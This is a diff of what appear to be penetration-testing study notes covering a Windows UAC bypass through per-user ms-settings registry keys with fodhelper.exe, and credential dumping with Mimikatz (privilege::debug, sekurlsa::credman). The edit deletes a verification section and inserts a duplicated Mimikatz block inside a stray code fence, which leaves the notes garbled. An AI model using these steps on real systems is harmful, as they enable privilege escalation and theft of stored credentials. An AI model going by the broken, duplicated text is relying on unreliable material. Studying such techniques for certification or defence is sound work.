@@ -321,7 +321,7 @@ Manually decrypt DPAPI-protected credentials
 For this example, the target is **LSASS memory** using `sekurlsa`.
 
 ---
-#   🚨Bypass UAC
+🚨Bypass UAC
 
 > [!info]  
 > **Goal:** Bypass **User Account Control (UAC)** to execute a command with elevated Administrator privileges.
@@ -355,48 +355,33 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 > [!important]  
 > `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.
 
-### 🧠 Important Verification
 
-Running:
+```
+# 🔓 11. Mimikatz `sekurlsa::credman`
+
+Start Mimikatz:
 
 ```cmd
-whoami
+C:\Users\Administrator\Desktop> mimikatz.exe
 ```
 
-may still return:
+Then enable the privileges required for credential extraction:
 
 ```text
-mcharles
+mimikatz # privilege::debug
+Privilege '20' OK
 ```
 
-This is because the **username itself does not change**. The important difference is the **integrity/elevation level** of the process.
+Next, use:
 
 ```text
-mcharles
-   │
-   └── UAC bypass
-          ↓
-   Elevated Administrator context
-          ↓
-   Access to protected locations
+mimikatz # sekurlsa::credman
 ```
 
-> [!warning]  
-> **`whoami` alone is not sufficient to prove that UAC bypass succeeded.** Verify the process's elevation/integrity level and whether you can access Administrator-protected resources.
 
-### 🎯 CPTS Memory
 
-```text
-UAC Bypass
-   ↓
-Modify HKCU\Software\Classes\ms-settings
-   ↓
-Launch fodhelper.exe / computerdefaults.exe
-   ↓
-Elevated command execution
-   ↓
-Administrator-level access
-```
+---
+
 # 🔓 11. Mimikatz `sekurlsa::credman`
 
 Start Mimikatz:
